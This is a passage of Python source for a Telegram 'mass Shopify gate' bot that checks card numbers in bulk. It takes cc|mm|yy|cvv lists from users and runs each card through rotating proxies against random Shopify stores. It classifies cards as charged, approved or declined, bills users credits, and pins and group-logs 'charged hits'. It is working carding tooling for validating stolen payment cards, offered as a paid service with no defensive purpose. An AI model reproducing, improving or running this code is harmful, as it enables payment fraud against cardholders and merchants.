    bin_type     = html_escape(_display(bin_data.get("type")))
    gateway_display = html_escape("Aᴜᴛᴏsʜᴏᴘɪɪ")
    safe_response   = html_escape(str(response_msg))
    safe_proxy      = html_escape(str(proxy_status_formatted))
    gif_url         = await get_anime_gif()
    user_link       = build_user_link(user_obj)
    dev_link = dev_badge()
    user_display    = f"{user_link} {plan_badge(str(plan_name))}"

    final_status = (
        f'<b>ᎪꮲꮲꭱƦꮎꮩꭼꭰ</b> '
        f'<tg-emoji emoji-id="{CUSTOM_APPROVED_EMOJI_ID}">✅</tg-emoji>'
    )

    caption = (
        f'<b><a href="https://t.me/broken_wiz">[⌭]</a> Sᴛᴀᴛᴜs ➵ {final_status}</b>\n'
        f'<tg-emoji emoji-id="5920055227133725805">💳</tg-emoji>\n'
        f'⤷ <code>{html_escape(cc_formatted)}</code>\n'
        f"━━━━━━━━━━━\n"
        f'<b><a href="https://t.me/broken_wiz">⬢</a> Gᴀᴛᴇ ➵ {gateway_display} {api_price} {html_escape(str(currency))}</b>\n'
        f'<b><a href="https://t.me/broken_wiz">⬡</a> Rᴀᴡ ➵ {safe_response}</b>\n'
        f"━━━━━━━━━━━\n"
        f"<b>Tʏᴘᴇ ➵</b> <code>[ {bin_type} ]</code>\n"
        f"<b>Iɴꜰᴏ ➵</b> <code>{bin_scheme} - {bin_bank} - {bin_country}</code>\n"
        f"━━━━━━━━━━━\n"
        f'<tg-emoji emoji-id="5440621591387980068">🔜</tg-emoji> <b>➵ {float(time_take):.2f}s</b>\n'
        f'<tg-emoji emoji-id="6028240037366207289">👤</tg-emoji> <b>➵ {user_display}</b>\n'
        f'<tg-emoji emoji-id="5429615084856969948">🏴‍☠️</tg-emoji> <b>➵ {dev_link}</b>'
    )

    try:
        await bot.send_animation(
            chat_id=user_obj.id,
            animation=gif_url,
            caption=caption,
            parse_mode="HTML",
        )
    except (TelegramForbiddenError, TelegramBadRequest) as e:
        logging.warning(f"[MSH] Could not DM approved hit to user {user_obj.id}: {e}")
    except Exception as e:
        logging.error(f"Error sending approved message to DM: {e}")


async def send_charged_msg_to_user(
    bot: Bot, cc_formatted, response_msg, bin_data,
    proxy_status_formatted, api_price, user_obj, plan_name, currency="USD"
, time_take=0.0):
    """
    Send the charged hit to the user's DM (private chat) and auto-pin it.
    """
    bin_scheme   = html_escape(_display(bin_data.get("scheme")))
    bin_bank     = html_escape(_display(bin_data.get("bank")))
    country_name = html_escape(_display(bin_data.get("country")))
    country_flag = _display(bin_data.get("country_emoji"), "")
    bin_country  = f"{country_flag} {country_name}".strip() if country_flag else country_name
    bin_type     = html_escape(_display(bin_data.get("type")))
    gateway_display = html_escape("Aᴜᴛᴏsʜᴏᴘɪɪ")
    safe_response   = html_escape(str(response_msg))
    safe_proxy      = html_escape(str(proxy_status_formatted))
    gif_url         = await get_anime_gif()
    user_link       = build_user_link(user_obj)
    dev_link = dev_badge()
    user_display    = f"{user_link} {plan_badge(str(plan_name))}"

    final_status = (
        f'<b>ᏟꮋꭺꭱƦᏽꭼꭰ</b> '
        f'<tg-emoji emoji-id="{get_next_charged_emoji_id()}">💎</tg-emoji>'
    )

    caption = (
        f'<b><a href="https://t.me/broken_wiz">[⌭]</a> Sᴛᴀᴛᴜs ➵ {final_status}</b>\n'
        f'<tg-emoji emoji-id="5920055227133725805">💳</tg-emoji>\n'
        f'⤷ <code>{html_escape(cc_formatted)}</code>\n'
        f"━━━━━━━━━━━\n"
        f'<b><a href="https://t.me/broken_wiz">⬢</a> Gᴀᴛᴇ ➵ {gateway_display} {api_price} {html_escape(str(currency))}</b>\n'
        f'<b><a href="https://t.me/broken_wiz">⬡</a> Rᴀᴡ ➵ {safe_response}</b>\n'
        f"━━━━━━━━━━━\n"
        f"<b>Tʏᴘᴇ ➵</b> <code>[ {bin_type} ]</code>\n"
        f"<b>Iɴꜰᴏ ➵</b> <code>{bin_scheme} - {bin_bank} - {bin_country}</code>\n"
        f"━━━━━━━━━━━\n"
        f'<tg-emoji emoji-id="5440621591387980068">🔜</tg-emoji> <b>➵ {float(time_take):.2f}s</b>\n'
        f'<tg-emoji emoji-id="6028240037366207289">👤</tg-emoji> <b>➵ {user_display}</b>\n'
        f'<tg-emoji emoji-id="5429615084856969948">🏴‍☠️</tg-emoji> <b>➵ {dev_link}</b>'
    )

    # Send to user's DM and auto-pin
    try:
        sent_msg = await bot.send_animation(
            chat_id=user_obj.id,
            animation=gif_url,
            caption=caption,
            parse_mode="HTML",
        )

        try:
            await bot.pin_chat_message(
                chat_id=user_obj.id,
                message_id=sent_msg.message_id,
                disable_notification=True
            )
            logging.info(
                f"[MSH] Pinned charged card msg {sent_msg.message_id} "
                f"in DM of user {user_obj.id}"
            )
        except (TelegramForbiddenError, TelegramBadRequest) as pin_err:
            logging.warning(
                f"[MSH] Could not pin charged card in DM of user {user_obj.id}: {pin_err}"
            )
        except Exception as pin_err:
            logging.error(f"[MSH] Unexpected error while pinning charged card: {pin_err}")

    except (TelegramForbiddenError, TelegramBadRequest) as e:
        logging.warning(f"[MSH] Could not DM charged hit to user {user_obj.id}: {e}")
    except Exception as e:
        logging.error(f"Error sending charged DM: {e}")

    # Also send to the extra charged group log
    group_caption = caption.replace(user_link, protect(user_link))
    try:
        await bot.send_animation(
            chat_id=EXTRA_CHARGED_GROUP_ID,
            animation=gif_url,
            caption=group_caption,
            parse_mode="HTML",
        )
    except Exception as e:
        logging.error(f"Error sending HIT to extra group: {e}")


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# BUTTONS & PROGRESS MESSAGE
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def get_result_buttons(session_id: str, is_running: bool = True) -> dict:
    session = MSH_SESSIONS.get(session_id, {})

    approved_count = session.get('approved', 0)
    dead_count     = session.get('dead', 0)
    charged_count  = session.get('charged', 0)
    checked_count  = session.get('checked', 0)

    buttons = []

    buttons.append([
        {
            "text":          f"AᴘᴘƦᴏᴠᴇᴅ ({approved_count})",
            "callback_data": MshResultCallback(session_id=session_id, result_type="live").pack(),
            "style":         "success",
        },
        {
            "text":          f"Dᴇᴄʟɪͷᴇᴅ ({dead_count})",
            "callback_data": MshResultCallback(session_id=session_id, result_type="dead").pack(),
            "style":         "danger",
        }
    ])

    buttons.append([
        {
            "text":          f"CʜᴀƦɢᴇᴅ ({charged_count})",
            "callback_data": MshResultCallback(session_id=session_id, result_type="charged").pack(),
            "style":         "primary",
        },
        {
            "text":          f"Tᴏᴛᴀʟ ({checked_count})",
            "callback_data": MshResultCallback(session_id=session_id, result_type="all").pack(),
            "style":         "primary",
        }
    ])

    if is_running:
        buttons.append([
            {
                "text":          "Sᴛᴏᴘ sᴇsSɪᴏɴ",
                "callback_data": MshStopCallback(session_id=session_id).pack(),
                "style":         "danger",
            }
        ])

    return {"inline_keyboard": buttons}


async def update_progress_message(bot: Bot, session_id):
    session = MSH_SESSIONS.get(session_id)
    if not session:
        return

    current_time = time.time()
    last_update  = session.get('last_update_time', 0)
    is_finished  = session['status'] == "<b>Sᴜᴍᴍᴀʀʏ</b>"  # Fixed: was "</>"
    is_stopped   = session['status'] == "<b>Sᴛᴏᴘᴘᴇᴅ</b>"

    if not is_finished and not is_stopped and (current_time - last_update) < 1.0:
        return

    elapsed     = current_time - session['start_time']
    minutes     = int(elapsed // 60)
    seconds     = int(elapsed % 60)
    elapsed_str = f"{minutes}m {seconds}s" if minutes > 0 else f"{seconds}s"

    if session['status'] == "<b>Cʜᴇᴄᴋɪɴɢ…</b>":
        status_icon = "<tg-emoji emoji-id=\"5258077393884562645\">⬜️</tg-emoji>"
    elif session['status'] == "<b>Sᴛᴏᴘᴘᴇᴅ</b>":
        status_icon = "<tg-emoji emoji-id=\"5247149163132493357\">⛔️</tg-emoji>"
    else:
        status_icon = "<tg-emoji emoji-id=\"6253754970349243649\">✨</tg-emoji>"

    status_text = session['status']
    status_text = f"<b>{status_text}</b>"

    proxy_manager = session.get('proxy_manager')
    proxy_info    = ""
    if proxy_manager:
        stats      = proxy_manager.get_stats()
        proxy_info = f"\n<b>𝐏𝐫𝐨𝐱𝐢𝐞𝐬 ➺</b> <code>{stats['active']}/{stats['total_proxies']} active</code>"

    text = (
        f"<a href='https://t.me/broken_wiz'>[᯼]</a> <b>Gᴀᴛᴇ ➺</b> <b>Sʜᴏᴘɪғʏ | Mass</b>\n"
        f"━━━━━━━━━━━━━━\n"
        f"      <a href='https://t.me/broken_wiz'>[◈]</a> <b>Sᴛᴀᴛᴜs ➺</b> {status_text} {status_icon}\n"
        f"      <a href='https://t.me/broken_wiz'>[ᱯ]</a> <b>Sᴇssɪᴏɴ ID ➺</b> <code>{session_id}</code>\n"
        f"━━━━━━━━━━━━━━\n"
        f"<b>Cʜᴇᴄᴋᴇᴅ ➺</b> <code>「 {session['checked']}/{session['total']} 」</code>\n"        
        f"♘ <b>ᎪꮲꮲꭱƦꮎꮩꭼꭰ ➺</b> <b>{session['approved']} </b><tg-emoji emoji-id=\"{CUSTOM_APPROVED_EMOJI_ID}\">✅</tg-emoji>\n"
        f"♞ <b>ᏟꮋꭺꭱƦᏽꭼꭰ ➺</b> <b>{session['charged']} </b><tg-emoji emoji-id=\"5427168083074628963\">💎</tg-emoji>\n"
        f"<b>Dᴇᴄʟɪɴᴇᴅ ➺</b> <b>{session['dead']} </b><tg-emoji emoji-id=\"{CUSTOM_DECLINED_EMOJI_ID}\">❌</tg-emoji>\n"        
        f"<b>Eʀʀᴏʀ ➺</b> <b>{session['errors']} </b><tg-emoji emoji-id=\"6255910249362885846\">⚠️</tg-emoji> \n"
        f"<b>Eʟᴀᴘsᴇᴅ ➺</b> <b>{elapsed_str}</b> <tg-emoji emoji-id=\"5258419835922030550\">🕔</tg-emoji> \n"
        f"<b>Dᴇᴠ ➺</b> <a href='https://t.me/broken_wiz'>𒉼 𝔦 乙</a> <tg-emoji emoji-id=\"5260681660189408650\">🏆</tg-emoji> <tg-emoji emoji-id=\"5429495925284296642\">🚬</tg-emoji> \n"
    )

    if session.get('last_text') == text:
        return

    if session_id not in SESSION_LOCKS:
        SESSION_LOCKS[session_id] = asyncio.Lock()

    async with SESSION_LOCKS[session_id]:
        if session.get('last_text') == text:
            return

        is_running   = session['status'] == "<b>Cʜᴇᴄᴋɪɴɢ…</b>"
        reply_markup = get_result_buttons(session_id, is_running=is_running)

        try:
            await bot.edit_message_text(
                chat_id=session['chat_id'],
                message_id=session['msg_id'],
                text=text,
                parse_mode="HTML",
                reply_markup=reply_markup,
                disable_web_page_preview=True
            )
            session['last_text']        = text
            session['last_update_time'] = current_time
        except TelegramBadRequest as e:
            error_msg = str(e).lower()
            if "message is not modified" not in error_msg and "message to edit not found" not in error_msg:
                logging.error(f"Error updating progress: {e}")
        except Exception as e:
            logging.error(f"Error updating progress: {e}")


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# SINGLE CARD PROCESSING
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

async def process_single_card(session_id, cc_formatted, cc_num, user_id, bot, user_obj, plan_name):
    check_started = time.time()
    session = MSH_SESSIONS.get(session_id)
    if not session:
        return

    if is_session_stopped(session_id):
        return

    is_group = session.get('is_group', False)

    sites_list = get_sites()
    if not sites_list:
        logging.error(f"[MSH] sites.txt is empty — no sites available for session {session_id}")
        session['errors'] += 1
        return

    proxy_manager = session.get('proxy_manager')
    if not proxy_manager:
        logging.error(f"[MSH] No proxy manager found for session {session_id}")
        session['errors'] += 1
        return

    DECLINED_RESPONSES = [
        'CARD_DECLINED', 'PROCESSING_ERROR', 'GENERIC_ERROR',
        'GENERIC_DECLINE', 'DO NOT HONOR', 'DO_NOT_HONOR',
        'UNKNOWN_ERROR', 'Processing Error',
        'PICK_UP_CARD', 'DECISION_RULE_BLOCK',
        'FRAUD_SUSPECTED',
        'INVALID_PURCHASE_TYPE', 'INVALID_PAYMENT_METHOD',
        'TEST_MODE_LIVE_CARD', 'AMOUNT_TOO_SMALL',
        'INCORRECT_NUMBER', 'EXPIRED_CARD', 'DS_REQUIRED', 'APPROVED',
        'PAYMENTS_CREDIT_CARD_BRAND_NOT_SUPPORTED',
    ]

    result_status         = "ERROR"
    response_msg          = "Unknown Error"
    api_price             = "0.00"
    api_currency          = "USD"
    proxy_status_formatted = "Unknown 🔴"
    bin_data              = {}
    used_proxy            = None

    MAX_RETRIES = 20
    attempt     = 0

    parts = cc_formatted.split('|')
    cc, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
    if len(yy) == 2:
        yy = "20" + yy

    if is_session_stopped(session_id):
        return

    try:
        bin_data = await get_bin_info(cc_num[:6])
    except Exception:
        bin_data = {}

    if is_session_stopped(session_id):
        return

    while attempt < MAX_RETRIES:
        if is_session_stopped(session_id):
            return

        attempt    += 1
        proxy_result = proxy_manager.get_next_proxy()

        if not proxy_result:
            logging.error(f"[MSH] No proxies available for session {session_id}")
            session['errors'] += 1
            return

        proxy, is_rotated = proxy_result
        used_proxy        = proxy

        if is_session_stopped(session_id):
            return

        site = random.choice(sites_list)

        if is_session_stopped(session_id):
            return

        try:
            success, message, url, gateway, price, currency, proxy_status_raw, http_status = \
                await process_card_api(cc=cc, mes=mm, ano=yy, cvv=cvv, site=site, proxy=proxy)

            if is_session_stopped(session_id):
                return

            proxy_status_formatted = "🟢" if "live" in str(proxy_status_raw).lower() else "🔴"
            api_price              = price
            api_currency           = currency

            proxy_manager.report_result(proxy, message, http_status)

            message_upper = message.upper()
            message_lower = message.lower()

            if "ORDER_PAID" in message_upper:
                result_status = "CHARGED"
                response_msg  = message
                break

            elif any(appr in message_upper for appr in APPROVED_RESPONSES):
                result_status = "APPROVED"
                response_msg  = message
                break

            elif any(declined.upper() in message_upper for declined in DECLINED_RESPONSES):
                result_status = "DEAD"
                response_msg  = message
                break

            else:
                is_proxy_error = proxy_manager.is_real_proxy_error(message, http_status)

                if is_proxy_error:
                    if attempt == MAX_RETRIES:
                        result_status = "ERROR"
                        response_msg  = f"Proxy Error: {message}"
                        break
                    else:
                        await asyncio.sleep(0.5)
                        continue

                elif any(retry_err.lower() in message_lower for retry_err in RETRY_ERRORS):
                    if attempt < MAX_RETRIES:
                        logging.info(
                            f"[MSH] Site/Step error ({message[:60]}...) — "
                            f"retrying with different site... ({attempt}/{MAX_RETRIES})"
                        )
                        await asyncio.sleep(0.3)
                        continue
                    else:
                        result_status = "ERROR"
                        response_msg  = f"Site Error (retried {MAX_RETRIES}x): {message}"
                        break

                else:
                    result_status = "ERROR"
                    response_msg  = message
                    break

        except asyncio.CancelledError:
            raise
        except Exception as e:
            if is_session_stopped(session_id):
                return
            proxy_manager.report_result(proxy, str(e), None)

            if attempt == MAX_RETRIES:
                result_status          = "ERROR"
                response_msg           = "Connection Error"
                proxy_status_formatted = "Error 🔴"
                break
            else:
                await asyncio.sleep(0.5)
                continue

    if is_session_stopped(session_id):
        return

    proxy_display = mask_proxy(used_proxy) if used_proxy else 'None'
    print(f"{cc_formatted} | {result_status} | {response_msg} | Proxy: {proxy_display}")
    logging.info(f"[MSH] {cc_formatted} | {result_status} | {response_msg} | Proxy: {proxy_display}")

    session['checked'] += 1

    elapsed = time.time() - check_started
    card_result_data = {
        'time_take': elapsed,
        'card':       cc_formatted,
        'response':   response_msg,
        'status':     result_status,
        'bin_info':   bin_data,
        'price':      api_price,
        'currency':   api_currency,
        'gateway':    'Shopify',
        'timestamp':  datetime.now().isoformat(),
        'proxy_used': proxy_display
    }

    if is_session_stopped(session_id):
        return

    if result_status == "CHARGED":
        session['charged'] += 1
        session['charged_cards'].append(card_result_data)

        await asyncio.gather(
            asyncio.to_thread(update_user_stats, user_id, True),
            asyncio.to_thread(increment_lifetime_stats, user_id, 1, 0, 0),
            asyncio.to_thread(log_hit_to_mshh, user_id, user_obj.username, user_obj.first_name),
            asyncio.to_thread(deduct_credits_atomic, user_id, 2),
        )

        if is_session_stopped(session_id):
            return

        await asyncio.gather(
            send_hit_log_to_group(bot, response_msg, user_obj, plan_name, proxy_status_formatted, api_price, api_currency),
            send_charged_msg_to_user(
                bot, cc_formatted, response_msg, bin_data,
                proxy_status_formatted, api_price, user_obj, plan_name, api_currency, elapsed
            ),
        )

    elif result_status == "APPROVED":
        session['approved'] += 1
        session['live_cards'].append(card_result_data)

        await asyncio.gather(
            asyncio.to_thread(update_user_stats, user_id, True),
            asyncio.to_thread(increment_lifetime_stats, user_id, 0, 1, 0),
            asyncio.to_thread(deduct_credits_atomic, user_id, 1),
        )

    elif result_status == "DEAD":
        session['dead'] += 1
        session['dead_cards'].append(card_result_data)

        await asyncio.gather(
            asyncio.to_thread(update_user_stats, user_id, False),
            asyncio.to_thread(increment_lifetime_stats, user_id, 0, 0, 1),
            asyncio.to_thread(deduct_credits_atomic, user_id, 1),
        )

    elif result_status == "ERROR":
        session['errors'] += 1
        session['error_cards'].append(card_result_data)
        await asyncio.gather(
            asyncio.to_thread(update_user_stats, user_id, False),
            asyncio.to_thread(increment_lifetime_stats, user_id, 0, 0, 1),
        )

    if is_session_stopped(session_id):
        return

    if session['checked'] % 25 == 0 or session['checked'] == session['total']:
        await update_progress_message(bot, session_id)


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# CALLBACK HANDLERS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

@router.callback_query(MshResultCallback.filter())
async def handle_result_callback(callback: types.CallbackQuery, callback_data: MshResultCallback):
    try:
        session_id  = callback_data.session_id
        result_type = callback_data.result_type

        session = MSH_SESSIONS.get(session_id)

        if not session:
            await callback.answer("⚠️ Session expired", show_alert=True)
            return

        if callback.from_user.id != session.get('user_id'):
            await callback.answer("❌ No permission", show_alert=True)
            return

        if is_buttons_locked(session_id):
            remaining = get_remaining_lock(session_id)
            await callback.answer(f"⏳ Please wait {remaining} seconds before using buttons", show_alert=True)
            return

        if result_type == "charged":
            count = len(session.get('charged_cards', []))
        elif result_type == "live":
            count = len(session.get('live_cards', []))
        elif result_type == "dead":
            count = len(session.get('dead_cards', []))
        else:
            count = (
                len(session.get('charged_cards', [])) +
                len(session.get('live_cards', [])) +
                len(session.get('dead_cards', [])) +
                len(session.get('error_cards', []))
            )

        if count == 0:
            type_names = {"charged": "Charged", "live": "Live", "dead": "Dead", "all": ""}
            type_name  = type_names.get(result_type, "")
            await callback.answer(f"❌ No {type_name} cards found", show_alert=True)
            return

        await callback.answer("📦 Generating report...", show_alert=False)

        user_obj    = session.get('user_obj')
        plan_name   = session.get('plan_name', 'TRIAL')
        user_msg_id = session.get('user_msg_id')

        file_buffer, filename, total_count = generate_result_file(session, result_type, user_obj, plan_name)

        file_content = file_buffer.read()
        file_buffer.seek(0)

        type_emojis = {"charged": "💎", "live": "✅", "dead": "❌", "all": "📁"}
        type_labels = {"charged": "ᏟꮋꭺꭱƦᏽꭼꭰ", "live": "ᎪꮲꮲꭱƦꮎꮩꭼꭰ", "dead": "Dᴇᴄʟɪɴᴇᴅ", "all": "Aʟʟ"}

        emoji = type_emojis.get(result_type, "📁")
        label = type_labels.get(result_type, "𝗔𝗹𝗹")

        caption = (
            f"<b>Rᴇsᴜʟt Tʏᴘᴇ ➺ {label} {emoji}</b>\n"
            f"<b>Tᴏᴛᴀʟ Cᴀʀᴅs ➺ {total_count}</b>\n"
            f"<b>Gᴀᴛᴇ ➺ Sʜᴏᴘɪғʏ | Mass</b>"
        )

        document = types.BufferedInputFile(file=file_content, filename=filename)

        try:
            await callback.bot.send_document(
                chat_id=callback.message.chat.id,
                document=document,
                caption=caption,
                parse_mode="HTML",
                reply_to_message_id=user_msg_id
            )
        except TelegramBadRequest as e:
            err_lower = str(e).lower()
            if "message to reply not found" in err_lower or "reply message not found" in err_lower:
                try:
                    document = types.BufferedInputFile(file=file_content, filename=filename)
                except Exception:
                    document = types.BufferedInputFile(file=file_content, filename=filename)
                await callback.message.answer_document(document=document, caption=caption, parse_mode="HTML")
            else:
                raise

    except Exception as e:
        logging.error(f"Error handling result callback: {e}", exc_info=True)
        try:
            await callback.message.answer(f"❌ Error: <code>{str(e)[:50]}</code>", parse_mode="HTML")
        except Exception:
            pass


@router.callback_query(MshStopCallback.filter())
async def handle_stop_callback(callback: types.CallbackQuery, callback_data: MshStopCallback):
    try:
        session_id = callback_data.session_id

        session = MSH_SESSIONS.get(session_id)

        if not session:
            await callback.answer("⚠️ Session expired", show_alert=True)
            return

        if callback.from_user.id != session.get('user_id'):
            await callback.answer("❌ No permission", show_alert=True)
            return

        if is_buttons_locked(session_id):
            remaining = get_remaining_lock(session_id)
            await callback.answer(f"⏳ Please wait {remaining} seconds before using buttons", show_alert=True)
            return

        if session['status'] != "<b>Cʜᴇᴄᴋɪɴɢ…</b>":
            await callback.answer("ℹ️ Not running", show_alert=True)
            return

        session['status'] = "<b>Sᴛᴏᴘᴘᴇᴅ</b>"

        print("🛑 [MSH] Stop signal sent")
        logging.info("🛑 [MSH] Stop signal sent")

        cancelled_count = 0
        for task in session.get('tasks', []):
            if not task.done():
                task.cancel()
                cancelled_count += 1

        await callback.answer("🛑 Stopping...", show_alert=False)

        print(f"🛑 [MSH] Cancelled {cancelled_count} tasks")
        logging.info(f"🛑 [MSH] Cancelled {cancelled_count} tasks")

        proxy_manager = session.get('proxy_manager')
        if proxy_manager:
            stats = proxy_manager.get_stats()
            print(
                f"📊 [ProxyManager Stats] Total: {stats['total_proxies']}, "
                f"Active: {stats['active']}, Failed: {stats['failed']}, "
                f"Uses: {stats['total_uses']}"
            )
            logging.info(f"📊 [ProxyManager Stats] {stats}")

        session['last_text'] = ""
        await update_progress_message(callback.bot, session_id)

    except Exception as e:
        logging.error(f"Error handling stop callback: {e}", exc_info=True)
        try:
            await callback.answer("❌ Error stopping", show_alert=True)
        except Exception:
            pass


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# MAIN COMMAND
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

@router.message(F.text.startswith("/msh") | F.caption.startswith("/msh"))
async def msh_command(message: types.Message):
    if not await asyncio.to_thread(is_gate_enabled, "msh"):
        await message.reply("🚧 <b>𝗠𝗮𝘀𝘀 𝗚𝗮𝘁𝗲 𝘂𝗻𝗱𝗲𝗿 𝗠𝗮𝗶𝗻𝘁𝗲𝗻𝗮𝗻𝗰𝗲.</b>", parse_mode="HTML")
        return

    user    = message.from_user
    user_id = user.id
    bot     = message.bot

    is_premium, _ = get_premium_status(user_id)
    if not is_premium:
        await message.reply(
            "<b>💎 Pʟᴇᴀsᴇ Uᴘɢʀᴀᴅᴇ Yᴏᴜʀ Pʟᴀɴ Tᴏ Usᴇ Tʜɪs Fᴇᴀᴛᴜʀᴇ.</b>\n\n👉 <b>Usᴇ /plan Tᴏ Uᴘɢʀᴀᴅᴇ.</b>",
            parse_mode="HTML"
        )
        return

    is_checking = False
    for session_id, session_data in list(MSH_SESSIONS.items()):
        if session_data.get('user_id') == user_id and session_data.get('status') == "<b>Cʜᴇᴄᴋɪɴɢ…</b>":
            is_checking = True
            break

    if is_checking:
        await message.reply(
            "⚠️ <b>𝗔𝗰𝘁𝗶𝘃𝗲 𝗦𝗲𝘀𝘀𝗶𝗼𝗻</b>\n\n"
            "You have a check running.\n"
            "Use the <b>🛑 Stop</b> button to stop it.",
            parse_mode="HTML"
        )
        return

    user_proxies = global_proxy_manager.get_all_proxies()
    if not user_proxies:
        await message.reply(
            "⚠️ <b>𝗡𝗼 𝗚𝗹𝗼𝗯𝗮𝗹 𝗣𝗿𝗼𝘅𝗶𝗲𝘀!</b>\n\n"
            "The bot owner has not loaded any proxies yet. Please try again later.",
            parse_mode="HTML"
        )
        return

    # Collect raw text from command, reply, caption, and/or attached file
    raw_text = ""

    cmd_text = message.text or message.caption or ""
    parts    = cmd_text.split(maxsplit=1)
    if len(parts) > 1:
        raw_text += parts[1] + " "

    if message.reply_to_message:
        replied_msg = message.reply_to_message
        if replied_msg.text:
            raw_text += replied_msg.text + " "
        elif replied_msg.caption:
            raw_text += replied_msg.caption + " "

    document = message.document
    if not document and message.reply_to_message:
        document = message.reply_to_message.document

    if document:
        if document.file_size > 5 * 1024 * 1024:
            await message.reply("❌ File too large. Max 5MB.")
            return
        try:
            file_info    = await bot.get_file(document.file_id)
            byte_content = await bot.download_file(file_info.file_path)
            if byte_content:
                data      = byte_content.read() if hasattr(byte_content, 'read') else byte_content
                raw_text += data.decode('utf-8', errors='ignore')
        except Exception as e:
            await message.reply(f"❌ Error reading file: {e}")
            return

    if not raw_text.strip():
        await message.reply(
            "❌ <b>𝗡𝗼 𝗰𝗮𝗿𝗱𝘀 𝗳𝗼𝘂𝗻𝗱.</b>\n\n"
            "• <code>/msh cc|mm|yy|cvv</code>\n"
            "• Reply to cards with <code>/msh</code>\n"
            "• Send .txt file with <code>/msh</code>",
            parse_mode="HTML"
        )
        return

    # Extract & validate cards so we can check credits upfront
    extracted_cards = extract_cards_from_text(raw_text)
    if not extracted_cards:
        await message.reply("❌ No valid card formats found.")
        return

    valid_cards         = []
    expired_count       = 0
    invalid_luhn_count  = 0
    MAX_VALID_CARDS     = 10000

    for card_string in extracted_cards:
        if len(valid_cards) >= MAX_VALID_CARDS:
            break
        parts_c = card_string.split('|')
        if len(parts_c) != 4:
            continue
        cc, mm, yy, cvv = parts_c
        if not luhn_check(cc):
            invalid_luhn_count += 1
            continue
        if is_expired(mm, yy):
            expired_count += 1
            continue
        valid_cards.append((card_string, cc))

    total_cards = len(valid_cards)
    if total_cards == 0:
        filter_info = ""
        if expired_count > 0 or invalid_luhn_count > 0:
            filter_info = f"Filtered {invalid_luhn_count} invalid & {expired_count} expired.\n"
        await message.reply(f"{filter_info}❌ No valid cards to check.", parse_mode="HTML")
        return

    # Credit check: user must have at least 1 credit per card
    current_credits = await asyncio.to_thread(get_user_credits, user_id)
    if current_credits < total_cards:
        await message.reply(
            f"❌ <b>𝗜𝗻𝘀𝘂𝗳𝗳𝗶𝗰𝗶𝗲𝗻𝘁 𝗖𝗿𝗲𝗱𝗶𝘁𝘀</b>\n\n"
            f"You need <b>{total_cards}</b> credits to check <b>{total_cards}</b> cards.\n"
            f"Your balance: <b>{current_credits}</b> credits.\n\n"
            f"Please add more credits or reduce the number of cards.",
            parse_mode="HTML"
        )
        return

    is_group = message.chat.type in ("group", "supergroup", "channel")

    asyncio.create_task(
        process_mass_check_background(message, bot, valid_cards, user, user_proxies, is_group)
    )


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# BACKGROUND PROCESSING
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

async def process_mass_check_background(
    message: types.Message, bot: Bot, valid_cards: list,
    user_obj, user_proxies, is_group: bool = False
):
    """
    Receives a pre-validated list of (card_string, cc_num) tuples.
    """
    user_id     = user_obj.id
    chat_id     = message.chat.id
    total_cards = len(valid_cards)

    if total_cards == 0:
        await message.reply("❌ No valid cards to check.", parse_mode="HTML")
        return

    session_id    = "".join(random.choices(string.ascii_uppercase + string.digits, k=8))
    plan_name     = await get_user_plan_name(user_id)
    proxy_manager = ProxyManager(user_proxies, session_id)
    proxy_stats   = proxy_manager.get_stats()

    logging.info(
        f"🔄 [MSH] Session {session_id} initialized with ProxyManager: "
        f"{proxy_stats['total_proxies']} proxies (normalized)"
    )

    initial_text = (
        f"<a href='https://t.me/broken_wiz'>[᯼]</a> <b>Gᴀᴛᴇ ➺</b> <b>Sʜᴏᴘɪғʏ | Mass</b>\n"
        f"━━━━━━━━━━━━━━\n"
        f"      <a href='https://t.me/broken_wiz'>[◈]</a> <b>Sᴛᴀᴛᴜs ➺</b> Cʜᴇᴄᴋɪɴɢ… <tg-emoji emoji-id=\"6253754970349243649\">✨</tg-emoji>\n"
        f"      <a href='https://t.me/broken_wiz'>[ᱯ]</a> <b>Sᴇssɪᴏɴ ID ➺</b> <code>{session_id}</code>\n"
        f"━━━━━━━━━━━━━━\n"
        f"<b>Cʜᴇᴄᴋᴇᴅ ➺</b> <code>「 0/{total_cards} 」</code>\n"        
        f"♘ <b>ᎪꮲꮲꭱƦꮎꮩꭼꭰ ➺</b> <b>0</b> <tg-emoji emoji-id=\"{CUSTOM_APPROVED_EMOJI_ID}\">✅</tg-emoji>\n"
        f"♞ <b>ᏟꮋꭺꭱƦᏽꭼꭰ ➺</b> <b>0</b> <tg-emoji emoji-id=\"5427168083074628963\">💎</tg-emoji>\n"
        f"<b>Dᴇᴄʟɪɴᴇᴅ ➺</b> <b>0</b> <tg-emoji emoji-id=\"{CUSTOM_DECLINED_EMOJI_ID}\">❌</tg-emoji>\n"        
        f"<b>Eʀʀᴏʀ ➺</b> <b>0</b> <tg-emoji emoji-id=\"6255910249362885846\">⚠️</tg-emoji>\n"
        f"<b>Eʟᴀᴘsᴇᴅ ➺</b> <b>0s</b> <tg-emoji emoji-id=\"5258419835922030550\">🕔</tg-emoji>\n"
        f"<b>Dᴇᴠ ➺</b> <a href='https://t.me/broken_wiz'>𒉼 𝔦 乙</a> <tg-emoji emoji-id=\"5260681660189408650\">🏆</tg-emoji> <tg-emoji emoji-id=\"5429495925284296642\">🚬</tg-emoji>"
    )

    initial_buttons = get_result_buttons(session_id, is_running=True)
    progress_msg    = await message.reply(
        initial_text, parse_mode="HTML",
        reply_markup=initial_buttons, disable_web_page_preview=True
    )

    MSH_SESSIONS[session_id] = {
